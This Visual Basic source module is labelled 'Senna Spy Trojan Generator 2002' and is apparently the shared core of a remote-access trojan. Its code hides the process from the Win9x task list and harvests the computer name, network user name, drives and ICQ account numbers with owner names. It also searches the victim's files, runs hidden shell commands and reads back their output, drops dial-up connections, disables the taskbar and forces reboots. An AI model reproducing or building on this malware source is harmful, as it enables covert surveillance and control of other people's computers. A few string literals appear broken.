Attribute VB_Name = "GLOBAL"
' Senna Spy Trojan Generator 2002
' The First Internet-Trojan Generator In The World !

Option Explicit

Public Const MAX_PATH As Integer = 260
Public Const RAS_MAXENTRYNAME As Integer = 256
Public Const RAS_MAXDEVICETYPE As Integer = 16
Public Const RAS_MAXDEVICENAME As Integer = 128

Public Const RAS_RASCONNSIZE9x As Integer = 412
Public Const RAS_RASCONNSIZEME As Integer = 676
' Struct RasConn for Win9x
Public Type RasConn9x
  dwSize As Long
  hRasConn As Long
  szEntryName(RAS_MAXENTRYNAME) As Byte
  szDeviceType(RAS_MAXDEVICETYPE) As Byte
  szDeviceName(RAS_MAXDEVICENAME) As Byte
End Type

' Struct RASCONNSTATUS
Public Type RASCONNSTATUS
    dwSize As Long
    RasConnState As Long
    dwError As Long
    szDeviceType(RAS_MAXDEVICETYPE) As Byte
    szDeviceName(RAS_MAXDEVICENAME) As Byte
End Type

' Struct RasConn for WinME
Public Type RasConnME
    dwSize As Long
    hRasConn As Long
    szEntryName(RAS_MAXENTRYNAME) As Byte
    szDeviceType(RAS_MAXDEVICETYPE) As Byte
    szDeviceName(RAS_MAXDEVICENAME) As Byte

    szPhoneBook(MAX_PATH) As Byte
    swSubEntry As Long

End Type

' Get SO Version
Public Enum SistemaOperacional
    Win9x
    WinME
    WinNT
    Win2k
    WinXP
End Enum
Dim SOAtual As SistemaOperacional

Private Type OSVERSIONINFOEX
   dwOSVersionInfoSize As Long
   dwMajorVersion As Long
   dwMinorVersion As Long
   dwBuildNumber As Long
   dwPlatformId As Long
   szCSDVersion As String * 128
   wServicePackMajor As Integer
   wServicePackMinor As Integer
   wSuiteMask As Integer
   wProductType As Byte
   wReserved As Byte
End Type

Global ICQSended as Boolean
Private Declare Function WaitForSingleObject Lib "kernel32" (ByVal hHandle As Long, ByVal dwMilliseconds As Long) As Long
Private Declare Function GetTempFileName Lib "kernel32" Alias "GetTempFileNameA" (ByVal lpszPath As String, ByVal lpPrefixString As String, ByVal wUnique As Long, ByVal lpTempFileName As String) As Long

Private Const SYNCHRONIZE = &H100000

Public Declare Function waveOutGetNumDevs Lib "winmm.dll" () As Long

Public Declare Function RegMSWINSCK Lib "MSWINSCK.OCX" Alias "DllRegisterServer" () As Long

Public Declare Function GetDriveType Lib "kernel32" Alias "GetDriveTypeA" (ByVal nDrive As String) As Long
Public Declare Function GetLogicalDriveStrings Lib "kernel32" Alias "GetLogicalDriveStringsA" (ByVal nBufferLength As Long, ByVal lpBuffer As String) As Long
Public Declare Function GetSystemDirectory Lib "kernel32.dll" Alias "GetSystemDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Public Declare Function GetWindowsDirectory Lib "kernel32.dll" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Public Declare Function SetWindowPos Lib "user32" (ByVal h%, ByVal hb%, ByVal x%, ByVal y%, ByVal cx%, ByVal cy%, ByVal f%) As Integer
Public Declare Function WNetGetUser Lib "mpr" Alias "WNetGetUserA" (ByVal lpName As String, ByVal lpUserName As String, lpnLength As Long) As Long
Public Declare Function GetComputerName Lib "kernel32" Alias "GetComputerNameA" (ByVal lpBuffer As String, nSize As Long) As Long
Public Declare Function CopyFile Lib "kernel32" Alias "CopyFileA" (ByVal lpExistingFileName As String, ByVal lpNewFileName As String, ByVal bFailIfExists As Long) As Long
Public Declare Function ExitWindowsEx Lib "user32" (ByVal uFlags As Long, ByVal dwReserved As Long) As Long
Declare Function SwapMouseButton Lib "user32" (ByVal bSwap As Long) As Long
Public Declare Function CloseHandle Lib "kernel32" (ByVal hFile As Long) As Long
Public Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long

Public Const SWP_HIDEWINDOW = &H80
Public Const SWP_SHOWWINDOW = &H40
Public Const SWP_NOMOVE = 2
Public Const SWP_NOSIZE = 1
Public Const FLAGS = SWP_NOMOVE Or SWP_NOSIZE
Public Const HWND_TOPMOST = -1
Public Const HWND_NOTOPMOST = -2

Public Const DRIVE_REMOVABLE = 2
Public Const DRIVE_FIXED = 3
Public Const DRIVE_REMOTE = 4
Public Const DRIVE_CDROM = 5
Public Const DRIVE_RAMDISK = 6

Public Const ERROR_SUCCESS = 0&
Public Const APINULL = 0&

Public Const REG_SZ As Long = 1
Public Const REG_BINARY As Long = 3
Public Const REG_DWORD As Long = 4
Public Const HKEY_CLASSES_ROOT = &H80000000
Public Const HKEY_CURRENT_USER = &H80000001
Public Const HKEY_LOCAL_MACHINE = &H80000002
Public Const HKEY_USERS = &H80000003
Public Const ERROR_NONE = 0
Public Const ERROR_BADDB = 1
Public Const ERROR_BADKEY = 2
Public Const ERROR_CANTOPEN = 3
Public Const ERROR_CANTREAD = 4
Public Const ERROR_CANTWRITE = 5
Public Const ERROR_OUTOFMEMORY = 6
Public Const ERROR_INVALID_PARAMETER = 7
Public Const ERROR_ACCESS_DENIED = 8
Public Const ERROR_INVALID_PARAMETERS = 87
Public Const ERROR_NO_MORE_ITEMS = 259
Public Const KEY_ALL_ACCESS = &H3F
Public Const REG_OPTION_NON_VOLATILE = 0

Public Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
Public Declare Function RegCreateKeyEx Lib "advapi32.dll" Alias "RegCreateKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal Reserved As Long, ByVal lpClass As String, ByVal dwOptions As Long, ByVal samDesired As Long, ByVal lpSecurityAttributes As Long, phkResult As Long, lpdwDisposition As Long) As Long
Public Declare Function RegOpenKey Lib "advapi32.dll" Alias " RegOpenKeyA" (ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long
Public Declare Function RegOpenKeyEx Lib "advapi32.dll" Alias "RegOpenKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
Public Declare Function RegQueryValueEx Lib "advapi32.dll" Alias "RegQueryValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, lpData As Any, lpcbData As Long) As Long
Public Declare Function RegQueryValueExString Lib "advapi32.dll" Alias "RegQueryValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, ByVal lpData As String, lpcbData As Long) As Long
Public Declare Function RegQueryValueExLong Lib "advapi32.dll" Alias "RegQueryValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, lpData As Long, lpcbData As Long) As Long
Public Declare Function RegQueryValueExNULL Lib "advapi32.dll" Alias "RegQueryValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, ByVal lpData As Long, lpcbData As Long) As Long
Public Declare Function RegSetValueExString Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
Public Declare Function RegSetValueExLong Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpValue As Long, ByVal cbData As Long) As Long

Type OSVERSIONINFO
   dwOSVersionInfoSize As Long
   dwMajorVersion As Long
   dwMinorVersion As Long
   dwBuildNumber As Long
   dwPlatformId As Long
   szCSDVersion As String * 128
End Type

Type FILETIME
   dwLowDateTime As Long
   dwHighDateTime As Long
End Type

Public Const LB_INITSTORAGE = &H1A8
Public Const LB_ADDSTRING = &H180
Public Const WM_SETREDRAW = &HB
Public Const WM_VSCROLL = &H115
Public Const SB_BOTTOM = 7

Declare Function FindFirstFile Lib "kernel32" Alias "FindFirstFileA" (ByVal lpFileName As String, lpFindFileData As WIN32_FIND_DATA) As Long

Public Const INVALID_HANDLE_VALUE = -1

Declare Function FindNextFile Lib "kernel32" Alias "FindNextFileA" (ByVal hFindFile As Long, lpFindFileData As WIN32_FIND_DATA) As Long
Declare Function FindClose Lib "kernel32" (ByVal hFindFile As Long) As Long

Public Const MaxLFNPath = 260

Type WIN32_FIND_DATA
   dwFileAttributes As Long
   ftCreationTime As FILETIME
   ftLastAccessTime As FILETIME
   ftLastWriteTime As FILETIME
   nFileSizeHigh As Long
   nFileSizeLow As Long
   dwReserved0 As Long
   dwReserved1 As Long
   cFileName As String * MaxLFNPath
   cShortFileName As String * 14
End Type

Public WFD As WIN32_FIND_DATA, hItem&, hFile&

Public Declare Function SystemParametersInfo& Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction&, ByVal uParam&, ByVal lpvParam As Any, ByVal fuWinIni&)
Public Declare Function EnableWindow Lib "user32" (ByVal hWnd As Integer, ByVal aBOOL As Integer) As Integer
Public Declare Function IsWindowEnabled Lib "user32" (ByVal hWnd As Integer) As Integer

Public Const SPIF_UPDATEINIFILE = &H1
Public Const SPI_SETDESKWALLPAPER = 20
Public Const SPIF_SENDWININICHANGE = &H2
Public Const RAS_RASCONNSIZE As Integer = 412

Public Type RasEntryName
    dwSize As Long
    szEntryName(RAS_MAXENTRYNAME) As Byte
End Type

Public Type RasConn
    dwSize As Long
    hRasConn As Long
    szEntryName(RAS_MAXENTRYNAME) As Byte
    szDeviceType(RAS_MAXDEVICETYPE) As Byte
    szDeviceName(RAS_MAXDEVICENAME) As Byte
End Type

Public gstrISPName As String
Public ReturnCode As Long

Declare Function RasEnumConnections Lib "rasapi32.dll" Alias "RasEnumConnectionsA" (lpRasConn As Any, lpcb As Long, lpcConnections As Long) As Long
Declare Function RasHangUp Lib "rasapi32.dll" Alias "RasHangUpA" (ByVal hRasConn As Long) As Long
Declare Function RasGetConnectStatus Lib "RasApi32.dll" Alias "RasGetConnectStatusA" (ByVal hRasCon As Long, lpStatus As Any) As Long

Const RAS95_MaxEntryName = 256
Const RAS95_MaxDeviceType = 16
Const RAS95_MaxDeviceName = 32

Private Type RASCONN95
    dwSize As Long
    hRasCon As Long
    szEntryName(RAS95_MaxEntryName) As Byte
    szDeviceType(RAS95_MaxDeviceType) As Byte
    szDeviceName(RAS95_MaxDeviceName) As Byte
End Type

Private Type RASCONNSTATUS95
    dwSize As Long
    RasConnState As Long
    dwError As Long
    szDeviceType(RAS95_MaxDeviceType) As Byte
    szDeviceName(RAS95_MaxDeviceName) As Byte
End Type

Public Const TH32CS_SNAPPROCESS = &H2

Public Const PROCESS_QUERY_INFORMATION = 1024
Public Const PROCESS_VM_READ = 16

Public Const PROCESS_TERMINATE = &H1

Type PROCESSENTRY32
     dwSize As Long
     cntUsage As Long
     th32ProcessID As Long
     th32DefaultHeapID As Long
     th32ModuleID As Long
     cntThreads As Long
     th32ParentProcessID As Long
     pcPriClassBase As Long
     dwFlags As Long
     szExeFile As String * MAX_PATH
End Type

Public Declare Function CreateToolhelpSnapshot Lib "kernel32" Alias "CreateToolhelp32Snapshot" (ByVal lFlags As Long, ByVal lProcessID As Long) As Long
Public Declare Function TerminateProcess Lib "kernel32" (ByVal hProcess As Long, ByVal uExitCode As Long) As Long
Public Declare Function ProcessFirst Lib "kernel32" Alias "Process32First" (ByVal hSnapShot As Long, uProcess As PROCESSENTRY32) As Long
Public Declare Function ProcessNext Lib "kernel32" Alias "Process32Next" (ByVal hSnapShot As Long, uProcess As PROCESSENTRY32) As Long
Public Declare Function EnumProcesses Lib "psapi.dll" (ByRef lpidProcess As Long, ByVal cb As Long, ByRef cbNeeded As Long) As Long
Public Declare Function GetModuleFileNameExA Lib "psapi.dll" (ByVal hProcess As Long, ByVal hModule As Long, ByVal ModuleName As String, ByVal nSize As Long) As Long
Public Declare Function EnumProcessModules Lib "psapi.dll" (ByVal hProcess As Long, ByRef lphModule As Long, ByVal cb As Long, ByRef cbNeeded As Long) As Long
Public Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long
Public Declare Function RegisterServiceProcess Lib "kernel32.dll" (ByVal dwProcessId As Long, ByVal dwType As Long) As Long
Public Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Long, ByVal hwndCallback As Long) As Long
Public Declare Function SetDoubleClickTime Lib "user32" (ByVal wCount As Long) As Long
Public Declare Function CloseClipboard Lib "user32" () As Long
Public Declare Function OpenClipboard Lib "user32" (ByVal hwnd As Long) As Long

Global Const VER_PLATFORM_WIN32s = 0
Global Const VER_PLATFORM_WIN32_WINDOWS = 1
Global Const VER_PLATFORM_WIN32_NT = 2

Declare Function GetVersionEx Lib "kernel32" Alias "GetVersionExA" (ByRef lpVersionInformation As any) As Long

Global Const EWX_REBOOT = 2

Public Const ANYSIZE_ARRAY = 1

Type LARGE_INTEGER
     lowpart As Long
     highpart As Long
End Type

Type LUID_AND_ATTRIBUTES
     pLuid As LARGE_INTEGER
     Attributes As Long
End Type

Type TOKEN_PRIVILEGES
     PrivilegeCount As Long
     Privileges(ANYSIZE_ARRAY) As LUID_AND_ATTRIBUTES
End Type

Public Const TOKEN_ADJUST_PRIVILEGES = 32
Public Const TOKEN_QUERY = 8
Public Const SE_PRIVILEGE_ENABLED As Long = 2

Declare Function LookupPrivilegeValue Lib "advapi32.dll" Alias "LookupPrivilegeValueA" (ByVal lpSystemName As String, ByVal lpName As String, lpLuid As LARGE_INTEGER) As Long
Declare Function GetCurrentProcess Lib "Kernel32" () As Long
Declare Function AdjustTokenPrivileges Lib "advapi32.dll" (ByVal TokenHandle As Long, ByVal DisableAllPrivileges As Long, NewState As TOKEN_PRIVILEGES, ByVal BufferLength As Long, PreviousState As TOKEN_PRIVILEGES, ReturnLength As Long) As Long
Declare Function OpenProcessToken Lib "advapi32.dll" (ByVal ProcessHandle As Long, ByVal DesiredAccess As Long, TokenHandle As Long) As Long

Global cAllICQUsers As String
Global cFirstUIN As String
Global cDrives As String
Global cDrivesString As String
Global cWindowsFolder As String
Global cSystemFolder As String
Global cICQDirectory As String
Global cAppDirectory As String
Global cComputer As String
Global cBuffer As String * 255

Global nTrojanPort As Long

Public IsTaskBarEnabled As Integer
Public TaskBarMenuHwnd As Integer
Public TaskBarhWnd As Long

Global xAnswer As Variant
Global lWindowsNT As Boolean

Public Function SetValueEx(ByVal hKey As Long, sValueName As String, lType As Long, vValue As Variant) As Long
   Dim lValue As Long
   Dim sValue As String

   Select Case lType
      Case REG_SZ
           sValue = vValue & Chr$(0)
           SetValueEx = RegSetValueExString(hKey, sValueName, 0&, lType, sValue, Len(sValue))
      Case REG_DWORD
           lValue = vValue
           SetValueEx = RegSetValueExLong(hKey, sValueName, 0&, lType, lValue, 4)
   End Select
End Function

Function QueryValueEx(ByVal lhKey As Long, ByVal szValueName As String, vValue As Variant) As Long
   On Error GoTo QueryValueExError

   Dim cch As Long
   Dim lrc As Long
   Dim lType As Long
   Dim lValue As Long
   Dim nLoop As Long
   Dim sValue As String
   Dim sBinaryString As String

   lrc = RegQueryValueExNULL(lhKey, szValueName, 0&, lType, 0&, cch)

   If lrc <> ERROR_NONE Then Error 5
   Select Case lType
      Case REG_SZ:
           sValue = String(cch, 0)
           lrc = RegQueryValueExString(lhKey, szValueName, 0&, lType, sValue, cch)

           If lrc = ERROR_NONE Then
              vValue = Left$(sValue, cch - 1)
           Else
              vValue = Empty
           End If

      Case REG_BINARY
           sValue = String(cch, 0)
           lrc = RegQueryValueExString(lhKey, szValueName, 0&, lType, sValue, cch)

           If lrc = ERROR_NONE Then
              vValue = sValue
           Else
              vValue = Empty
           End If

           sBinaryString = "
           For nLoop = 1 To Len(sValue)
               sBinaryString = sBinaryString & Format$(Hex(Asc(Mid$(vValue, nLoop, 1))), "00") & " "
           Next
           vValue = sBinaryString

      Case REG_DWORD:
           lrc = RegQueryValueExLong(lhKey, szValueName, 0&, lType, lValue, cch)
           If lrc = ERROR_NONE Then vValue = lValue

      Case Else
           lrc = -1
   End Select

QueryValueExExit:
   QueryValueEx = lrc
   Exit Function

QueryValueExError:
   Resume QueryValueExExit
End Function

Public Sub CreateNewKey(sNewKeyName As String, lPredefinedKey As Long)
   Dim hNewKey As Long
   Dim lRetVal As Long

   lRetVal = RegCreateKeyEx(lPredefinedKey, sNewKeyName, 0&, vbNullString, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, 0&, hNewKey, lRetVal)
   RegCloseKey (hNewKey)
End Sub

Public Sub SetKeyValue(ByVal hKey As Long, sKeyName As String, sValueName As String, vValueSetting As Variant, lValueType As Long)
   Dim lRetVal As Long

   lRetVal = RegOpenKeyEx(hKey, sKeyName, 0, KEY_ALL_ACCESS, hKey)
   lRetVal = SetValueEx(hKey, sValueName, lValueType, vValueSetting)

   RegCloseKey (hKey)
End Sub

Public Function QueryValue(ByVal hKey As Long, sKeyName As String, sValueName As String) As String
   Dim lRetVal As Long
   Dim vValue As Variant

   lRetVal = RegOpenKeyEx(hKey, sKeyName, 0, KEY_ALL_ACCESS, hKey)
   lRetVal = QueryValueEx(hKey, sValueName, vValue)

   QueryValue = vValue
   RegCloseKey (hKey)
End Function

Public Function InternetConnected() As Boolean
    Dim RasConn_9x As RasConn9x
    Dim RasConn_ME As RasConnME

    Dim lpcb As Long
    Dim hRasConn As Long

    Dim nRetorno As Long
    Dim Tstatus As RASCONNSTATUS

    Tstatus.dwSize = 160
    
    ' For WinME and other
    If SOAtual <> Win9x Then
        RasConn_ME.dwSize = RAS_RASCONNSIZEME
        lpcb = RAS_MAXENTRYNAME * RasConn_ME.dwSize

        nRetorno = RasEnumConnections(RasConn_ME, lpcb, 0)
        RasGetConnectStatus RasConn_ME.hRasConn, Tstatus

    Else ' For Win9x
        RasConn_9x.dwSize = RAS_RASCONNSIZE9x
        lpcb = RAS_MAXENTRYNAME * RasConn_9x.dwSize

        nRetorno = RasEnumConnections(RasConn_9x, lpcb, 0)
        RasGetConnectStatus RasConn_9x.hRasConn, Tstatus

    End If

    If nRetorno = 0 Then
        InternetConnected = (Tstatus.RasConnState = &H2000)
    End If

End Function

Public Sub ObtemDrives()
   Dim cWhatDrive As String
   Dim cAllDrives As String
   Dim r&, pos%, DriveType&

   cAllDrives = Space$(64)
   r& = GetLogicalDriveStrings(Len(cAllDrives), cAllDrives)

   cAllDrives = Left$(cAllDrives, r&)
   cDrivesString = ""
   cDrives = ""

   Do
      pos% = InStr(cAllDrives, Chr$(0))
      If pos% Then
         cWhatDrive = Left$(cAllDrives, pos%)
         DriveType& = GetDriveType(cWhatDrive)
         cWhatDrive = RemoveChr0(cWhatDrive)

         If cWhatDrive <> "a:\" And cWhatDrive <> "b:\" Then
            If cDrives = "" Then
               cDrives = cWhatDrive
            Else
               cDrives = cDrives + ";" + cWhatDrive
            End If

            If DriveType& = DRIVE_REMOVABLE Then
               cDrivesString = cDrivesString + cWhatDrive + "=Floppy/Removable  "
            ElseIf DriveType& = DRIVE_FIXED Then
               cDrivesString = cDrivesString + cWhatDrive + "=HD  "
            ElseIf DriveType& = DRIVE_REMOTE Then
               cDrivesString = cDrivesString + cWhatDrive + "=Remoto  "
            ElseIf DriveType& = DRIVE_CDROM Then
               cDrivesString = cDrivesString + cWhatDrive + "=CD-ROM  "
            ElseIf DriveType& = DRIVE_RAMDISK Then
               cDrivesString = cDrivesString + cWhatDrive + "=RamDisk  "
            Else
               cDrivesString = cDrivesString + cWhatDrive + "=Undefined  "
            End If
         End If

         cAllDrives = Mid$(cAllDrives, pos% + 1, Len(cAllDrives))
      End If
   Loop Until cAllDrives = ""

   cDrivesString = UCase(cDrivesString)
   cDrives = UCase(cDrives)
End Sub

Public Sub ICQ_UIN()
   Dim cArquivo As String
   Dim cUsuario As String
   Dim cUIN As String
   Dim nLoop As Integer

   cAllICQUsers = ""
   cFirstUIN = ""
   If (Right(cICQDirectory, 1) <> "\") Then cICQDirectory = cICQDirectory + "\"
   cArquivo = Left(cICQDirectory, Len(cICQDirectory) - 1)

   If cArquivo = "" Then
      cAllICQUsers = "Não Usa ICQ"
   Else
      cArquivo = Dir(cArquivo & "\*.UIN")

      Do While cArquivo <> ""
         cUIN = Left(cArquivo, Len(cArquivo) - 4)
         cUsuario = QueryValue( HKEY_CURRENT_USER, "SOFTWARE\Mirabilis\ICQ\Owners\" & cUIN, "Name")
         If Len(cUsuario) = 0 Then
            cUsuario = QueryValue(HKEY_LOCAL_MACHINE, "SOFTWARE\Mirabilis\ICQ\Owners\" & cUIN, "Name")
         End If

         If cUsuario <> "" Then
            cAllICQUsers = cAllICQUsers & "UIN: " & cUIN & " - " & cUsuario & vbCrLf
         End If

         If cFirstUIN = "" Then cFirstUIN = cUIN + "-" + cUsuario
         cArquivo = Dir
      Loop
   End If
End Sub

Function ComputerName() As String
   Call GetComputerName(cBuffer, 255)
   ComputerName = Left$(cBuffer, InStr(cBuffer, Chr$(0)) - 1)
End Function

Function NetUserName() As String
   Dim rtn As Long

   rtn = WNetGetUser("", cBuffer, 255)
   If rtn = 0 Then
      NetUserName = Left(cBuffer, InStr(cBuffer, Chr$(0)) - 1)
   Else
      NetUserName = ""
   End If
End Function

Public Sub SearchDirs(Index As Integer, FileSpec As String, curpath$, ByVal cCommandCode)
   On Error Resume Next

   Dim dirs%, dirbuf$(), i%
   DoEvents

   hItem& = FindFirstFile(curpath$ & "*.*", WFD)
   If hItem& <> INVALID_HANDLE_VALUE Then
      Do
         If (WFD.dwFileAttributes And vbDirectory) Then
            If Asc(WFD.cFileName) <> 46 Then
               If (dirs% Mod 10) = 0 Then ReDim Preserve dirbuf$(dirs% + 10)
               dirs% = dirs% + 1
               dirbuf$(dirs%) = Left$(WFD.cFileName, InStr(WFD.cFileName, vbNullChar) - 1)
            End If
         End If
      Loop While FindNextFile(hItem&, WFD)

      Call FindClose(hItem&)
   End If

   If cCommandCode = COMMAND_FIND_FILE Then
      Call SearchFileSpec(Index, FileSpec, curpath$, ANSWER_FIND_FILE)
   ElseIf cCommandCode = COMMAND_FIND_BITMAP Then
      Call SearchFileSpec(Index, FileSpec, curpath$, ANSWER_FIND_BITMAP)
   ElseIf cCommandCode = COMMAND_FIND_MULTIMEDIA Then
      Call SearchFileSpec(Index, FileSpec, curpath$, ANSWER_FIND_MULTIMEDIA)
   End If

   For i% = 1 To dirs%
       SearchDirs Index, FileSpec, curpath$ & dirbuf$(i%) & "\", cCommandCode
   Next i%
End Sub

Public Sub SearchFileSpec(Index As Integer, FileSpec As String, curpath$, ByVal cCommandCode)
   On Error Resume Next

   Dim lFoundFile As Boolean
   Dim cFile As String
   Dim nLoop As Long

   hFile& = FindFirstFile(curpath$ & FileSpec, WFD)

   If hFile& <> INVALID_HANDLE_VALUE Then
      Do
         DoEvents
         If Index <> -1 Then
            FRMMAIN.SM Index, cCommandCode & curpath$ & Left$(WFD.cFileName, InStr(WFD.cFileName, vbNullChar) - 1)
         End If
      Loop While FindNextFile(hFile&, WFD)

      Call FindClose(hFile&)
   End If
End Sub

Public Function VersaoWindows() As String
    Dim myOS As OSVERSIONINFOEX
    Dim OsVersionInf As OSVERSIONINFO
    
    Dim cSystem As String
    Dim lResult As Long
    
    myOS.dwOSVersionInfoSize = Len(myOS)
    lResult = GetVersionEx(myOS)
    If (lResult = 0) Then
        myOS.dwOSVersionInfoSize = Len(OsVersionInf)

        If (Not GetVersionEx(myOS)) Then
            Exit Function
        End If

    End If

    If myOS.dwPlatformId = VER_PLATFORM_WIN32_NT Then

        If (myOS.dwMajorVersion <= 4) Then
            cSystem = "Microsoft Windows NT "
            SOAtual = WinNT
            
            lWindowsNT = True
        ElseIf (myOS.dwMajorVersion = 5 And myOS.dwMinorVersion = 0) Then
            cSystem = "Microsoft Windows 2000 "
            SOAtual = Win2k

            lWindowsNT = True

        ElseIf (myOS.dwMajorVersion >= 5 And myOS.dwMinorVersion >= 1) Then
            cSystem = "Microsoft Windows XP "
            SOAtual = WinXP

            lWindowsNT = True
        End If

    ElseIf myOS.dwPlatformId = VER_PLATFORM_WIN32s Then
       cSystem = "Win32s "

    End If

    If myOS.dwPlatformId = VER_PLATFORM_WIN32_WINDOWS Then

        If (myOS.dwMajorVersion = 4 And myOS.dwMinorVersion = 0) Then
            cSystem = "Microsoft Windows 95 "
            SOAtual = Win9x

        End If

        If (myOS.dwMajorVersion = 4 And myOS.dwMinorVersion = 10) Then
            cSystem = "Microsoft Windows 98 "
            If (myOS.szCSDVersion = "A") Then
                cSystem = cSystem + "SE "
            End If
            SOAtual = Win9x

        End If

        If (myOS.dwMajorVersion = 4 And myOS.dwMinorVersion = 90) Then
            cSystem = "Microsoft Windows Millennium Edition "

            SOAtual = WinME
        End If

    End If

    VersaoWindows = cSystem
End Function

Public Function RemoveChr0(cString As String)
   While Right(cString, 1) = Chr$(0)
      cString = Left(cString, Len(cString) - 1)
   Wend

   RemoveChr0 = cString
End Function

Public Sub HangUp()
   Dim lpRasConn(255) As RasConn
   Dim lpcb As Long
   Dim lpcConnections As Long
   Dim hRasConn As Long
   Dim nLoop As Long

   lpRasConn(0).dwSize = RAS_RASCONNSIZE
   lpcb = RAS_MAXENTRYNAME * lpRasConn(0).dwSize
   lpcConnections = 0

   ReturnCode = RasEnumConnections(lpRasConn(0), lpcb, lpcConnections)
   If ReturnCode = ERROR_SUCCESS Then
      For nLoop = 0 To lpcConnections - 1
          If Trim(ByteToString(lpRasConn(nLoop).szEntryName)) = Trim(gstrISPName) Then
             hRasConn = lpRasConn(nLoop).hRasConn
             ReturnCode = RasHangUp(ByVal hRasConn)
          End If
      Next
   End If
End Sub

Public Function ByteToString(bytString() As Byte) As String
   Dim nLoop As Integer

   ByteToString = "
   nLoop = 0
   While bytString(nLoop) = 0&
      ByteToString = ByteToString & Chr(bytString(nLoop))
      nLoop = nLoop + 1
   Wend
End Function

Private Function FromSz(szStr As String) As String
   If InStr(szStr, vbNullChar) Then
      FromSz = Left(szStr, InStr(szStr, vbNullChar) - 1)
   Else
      FromSz = szStr
   End If
End Function

Public Function ShellGetText(Program As String) As String
       Dim sTempFile As String
       Dim hFile As Long
       Dim pid As Long
       Dim hProcess As Long
       Dim bResult As Boolean

       sTempFile = Space(1024)
       GetTempFileName Environ("TEMP"), "OUT", 0, sTempFile
       sTempFile = FromSz(sTempFile)

       pid = Shell(Environ("COMSPEC") & " /C " & Program & ">" & sTempFile, vbHidden)
       hProcess = OpenProcess(SYNCHRONIZE, True, pid)

       Do Until (hProcess = 0) Or WaitForSingleObject(hProcess, 60000)
          GoTo CloseHandles
       Loop

CloseHandles:
       hFile = FreeFile
       Open sTempFile For Binary As #hFile
       ShellGetText = Input$(LOF(hFile), hFile)
       Close #hFile

       CloseHandle hProcess
       Kill sTempFile
End Function

Public Sub FastTaskSwitching(bEnabled As Boolean)
   Dim bDisabled As Long

   bDisabled = Not bEnabled
   xAnswer = SystemParametersInfo(97, bDisabled, CStr(1), 0)
End Sub

Public Sub DisableTaskBar()
   TaskBarhWnd = FindWindow("Shell_traywnd", "")

   If TaskBarhWnd <> 0 Then
      If IsWindowEnabled(TaskBarhWnd) = 1 Then
         IsTaskBarEnabled = EnableWindow(TaskBarhWnd, 0)
      End If
   End If
End Sub

Public Sub EnableTaskBar()
   If IsTaskBarEnabled = 0 Then
      IsTaskBarEnabled = EnableWindow(TaskBarhWnd, 1)
   End If
End Sub

Public Function RebootSystem() As Boolean
   Dim hToken As Long
   Dim lAnswer As Long
   Dim tkp As TOKEN_PRIVILEGES
   Dim tkpOld As TOKEN_PRIVILEGES
   Dim fOkReboot As Boolean

   If lWindowsNT Then
      If OpenProcessToken(GetCurrentProcess(), _
              TOKEN_ADJUST_PRIVILEGES Or TOKEN_QUERY, hToken) Then

         lAnswer = LookupPrivilegeValue(vbNullString, "SeShutdownPrivilege", tkp.Privileges(0).pLuid)

         tkp.PrivilegeCount = 1
         tkp.Privileges(0).Attributes = SE_PRIVILEGE_ENABLED

         fOkReboot = AdjustTokenPrivileges(hToken, 0, tkp, LenB(tkpOld), tkpOld, lAnswer)
      End If

   Else
      fOkReboot = True
   End If

   If fOkReboot Then
      RebootSystem = (ExitWindowsEx(EWX_REBOOT, 0) <> 0)
   End If
End Function

Sub Main()
   On Error Resume Next

   cAppDirectory = App.Path

   If Right(cAppDirectory, 1) <> "\" Then
      cAppDirectory = cAppDirectory + "\"
   End If

   If App.PrevInstance Then
      End
   End If

   lWindowsNT = False
   xAnswer = VersaoWindows()

   If Not lWindowsNT Then
      xAnswer = RegisterServiceProcess(0, 1)
   EndIf

   xAnswer = GetSystemDirectory(cBuffer, Len(cBuffer))
   cSystemFolder = Left(cBuffer, xAnswer)
   xAnswer = GetWindowsDirectory(cBuffer, Len(cBuffer))
   cWindowsFolder = Left(cBuffer, xAnswer)

   If Right(cSystemFolder, 1) <> "\" Then
      cSystemFolder = cSystemFolder + "\"
   End If
   If Right(cWindowsFolder, 1) <> "\" Then
      cWindowsFolder = cWindowsFolder + "\"
   End If

   FRMMAIN.Show
End Sub
